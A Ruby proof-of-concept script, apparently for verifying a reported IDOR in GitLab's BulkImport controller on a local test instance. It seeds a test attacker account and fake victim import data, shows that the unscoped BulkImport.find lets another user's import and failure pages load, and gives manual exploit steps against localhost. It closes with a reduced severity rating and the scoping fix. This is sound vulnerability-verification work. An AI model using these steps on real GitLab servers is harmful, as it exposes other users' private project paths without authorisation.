#!/usr/bin/env ruby
# frozen_string_literal: true

# =============================================================================
# PoC: IDOR in BulkImport Controller — Unscoped Database Lookup
# =============================================================================
# Run inside the GitLab Rails console (docker exec -it gitlab gitlab-rails console)
# OR: cd /home/user/gitlab-source && bin/rails runner /home/user/testaa/poc_bulk_import_idor.rb
# =============================================================================

puts "=" * 72
puts "BulkImport Controller IDOR PoC"
puts "=" * 72
puts

conn = ApplicationRecord.connection

# ---------------------------------------------------------------------------
# 1. Setup: Create a victim user (user_a) who owns a bulk import
#    and an attacker user (user_b) who should NOT be able to see it
# ---------------------------------------------------------------------------
puts "[1] Setting up test users and bulk import data..."

user_a = User.find_by(username: 'root')
abort "ERROR: No root user found" unless user_a

# Create attacker user if not exists
user_b = User.find_by(username: 'attacker_idor')
unless user_b
  user_b = User.new(
    username: 'attacker_idor',
    email: 'attacker_idor@example.com',
    name: 'Attacker IDOR',
    password: 'attackerpass123!',
    password_confirmation: 'attackerpass123!',
    confirmed_at: Time.current,
    admin: false
  )
  user_b.skip_confirmation!
  user_b.save!(validate: false)
  puts "  Created attacker user: #{user_b.username} (id=#{user_b.id})"
  puts "  Password: attackerpass123!"
else
  puts "  Attacker user exists: #{user_b.username} (id=#{user_b.id})"
  puts "  Password: attackerpass123!"
end

puts "  Victim user: #{user_a.username} (id=#{user_a.id})"
puts

# ---------------------------------------------------------------------------
# 2. Create a BulkImport record owned by victim (user_a)
#    with sensitive source URL and entity paths
# ---------------------------------------------------------------------------
puts "[2] Creating victim's bulk import with sensitive data..."

# Create BulkImport record for user_a
org_id = conn.select_value("SELECT id FROM organizations LIMIT 1") || 1

bulk_import_id = conn.select_value(<<~SQL)
  INSERT INTO bulk_imports (user_id, source_type, status, created_at, updated_at, source_version, has_failures, organization_id)
  VALUES (#{user_a.id}, 0, 2, NOW(), NOW(), '17.0.0', true, #{org_id})
  RETURNING id
SQL

# Create BulkImports::Configuration with a sensitive source URL
conn.execute(<<~SQL)
  INSERT INTO bulk_import_configurations (bulk_import_id, url, created_at, updated_at)
  VALUES (#{bulk_import_id}, 'https://internal-gitlab.victim-corp.com', NOW(), NOW())
SQL

# Create entity with sensitive source/destination paths
entity_id = conn.select_value(<<~SQL)
  INSERT INTO bulk_import_entities (
    bulk_import_id, source_type, source_full_path, destination_name,
    destination_namespace, status, created_at, updated_at, destination_slug,
    source_xid
  ) VALUES (
    #{bulk_import_id}, 0, 'victim-corp/secret-internal-project',
    'imported-secret-project', 'attacker-should-not-see-this',
    2, NOW(), NOW(), 'imported-secret-project', 12345
  )
  RETURNING id
SQL

# Create a failure record with sensitive details
conn.execute(<<~SQL)
  INSERT INTO bulk_import_failures (
    bulk_import_entity_id, pipeline_class, exception_class, exception_message,
    created_at, source_url, source_title
  ) VALUES (
    #{entity_id}, 'BulkImports::Projects::Pipelines::RepositoryPipeline',
    'RuntimeError',
    'Failed to import: authentication token expired for https://internal-gitlab.victim-corp.com/api/v4/projects/12345',
    NOW(),
    'https://internal-gitlab.victim-corp.com/victim-corp/secret-internal-project',
    'secret-internal-project'
  )
SQL

puts "  BulkImport id=#{bulk_import_id} owned by user_a (#{user_a.username})"
puts "  Entity id=#{entity_id} source_path=victim-corp/secret-internal-project"
puts "  Source URL: https://internal-gitlab.victim-corp.com"
puts

# ---------------------------------------------------------------------------
# 3. Demonstrate the IDOR: Simulate what the controller does
# ---------------------------------------------------------------------------
puts "[3] Simulating controller behavior..."
puts

# What the VULNERABLE controller does (line 91):
puts "  VULNERABLE controller (bulk_imports_controller.rb:91):"
puts "    BulkImport.find(#{bulk_import_id})"
vulnerable_result = BulkImport.find(bulk_import_id)
puts "    => Found! owner=#{vulnerable_result.user.username}, source_type=#{vulnerable_result.source_type}"
puts "    No check that current_user == owner"
puts

# What the SECURE API does (lib/api/bulk_imports.rb:11-19):
puts "  SECURE API (lib/api/bulk_imports.rb:11-19):"
puts "    BulkImports::ImportsFinder.new(user: user_b).execute.find(#{bulk_import_id})"
begin
  secure_finder = BulkImports::ImportsFinder.new(user: user_b, params: {})
  secure_result = secure_finder.execute.find_by(id: bulk_import_id)
  if secure_result
    puts "    => BUG: Found! This should not happen"
  else
    puts "    => nil (correctly returns nothing for attacker)"
  end
rescue ActiveRecord::RecordNotFound => e
  puts "    => RecordNotFound (correctly blocked for attacker)"
end
puts

# ---------------------------------------------------------------------------
# 4. Show what data leaks through the HTML templates
# ---------------------------------------------------------------------------
puts "[4] Data leaked through unscoped controller..."
puts

import = BulkImport.find(bulk_import_id)
entity = import.entities.find(entity_id)

puts "  Via history page HTML template:"
puts "    - BulkImport exists: YES (id=#{import.id})"
puts "    - PendingReassignmentAlertPresenter renders for this import"
puts

puts "  Via failures page HTML template (full_path_with_fallback):"
puts "    - Entity full_path: #{entity.full_path_with_fallback}"
puts "    - Entity id: #{entity.id}"
puts "    - Rendered in page title and data attributes"
puts

puts "  Via BulkImport model (if controller exposed more):"
puts "    - source_version: #{import.source_version}"
puts "    - source_url: #{import.source_url}"
puts "    - has_failures: #{import.has_failures}"
puts "    - Entity source_full_path: #{entity.source_full_path}"
puts "    - Entity destination: #{entity.destination_namespace}/#{entity.destination_slug}"
puts

# ---------------------------------------------------------------------------
# 5. BUT: The Vue frontend fetches from the scoped API
# ---------------------------------------------------------------------------
puts "[5] IMPORTANT CAVEAT: Vue frontend uses the scoped API"
puts "    The history page HTML shell loads, but the table data"
puts "    comes from GET /api/v4/bulk_imports/#{bulk_import_id}/entities"
puts "    which uses ImportsFinder(user: current_user) — properly scoped."
puts "    So the attacker sees an empty table or gets a 404."
puts
puts "    The failures page HTML also loads (leaking entity path in the"
puts "    page title), but the failure details come from the scoped API."
puts

# ---------------------------------------------------------------------------
# 6. Provide URLs to test manually
# ---------------------------------------------------------------------------
puts "[6] Manual test steps:"
puts
puts "  1. Log in as attacker: username=attacker_idor password=attackerpass123!"
puts "     URL: http://localhost:8929/users/sign_in"
puts
puts "  2. Visit victim's bulk import history (should be blocked but isn't):"
puts "     URL: http://localhost:8929/import/bulk_imports/#{bulk_import_id}/history"
puts "     EXPECTED: 404 (not your import)"
puts "     ACTUAL:   200 OK — page renders with import id in breadcrumbs"
puts
puts "  3. Visit victim's entity failures (leaks entity path):"
puts "     URL: http://localhost:8929/import/bulk_imports/#{bulk_import_id}/history/#{entity_id}/failures"
puts "     EXPECTED: 404"
puts "     ACTUAL:   200 OK — page title shows '#{entity.full_path_with_fallback}'"
puts
puts "  4. Compare with the API (properly scoped — returns 404):"
puts "     curl -H 'PRIVATE-TOKEN: <attacker_token>' \\"
puts "       http://localhost:8929/api/v4/bulk_imports/#{bulk_import_id}/entities"
puts

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------
puts "=" * 72
puts "VERDICT"
puts "  The IDOR is REAL — BulkImport.find(params[:id]) is unscoped."
puts "  But the impact is LOWER than claimed:"
puts "    - History page: HTML shell loads but Vue table fetches from scoped API"
puts "    - Failures page: Leaks entity path in HTML, details from scoped API"
puts "    - Severity: LOW-MEDIUM (info disclosure of entity paths + existence)"
puts "    - NOT HIGH (attacker cannot see full import data or failure details)"
puts
puts "ROOT CAUSE"
puts "  File: app/controllers/import/bulk_imports_controller.rb"
puts "  Line 91: BulkImport.find(params[:id]) — no user scoping"
puts "  Compare: lib/api/bulk_imports.rb:12 — ImportsFinder(user: current_user)"
puts
puts "FIX"
puts "  Replace: @bulk_import ||= BulkImport.find(params[:id])"
puts "  With:    @bulk_import ||= current_user.bulk_imports.find(params[:id])"
puts "=" * 72
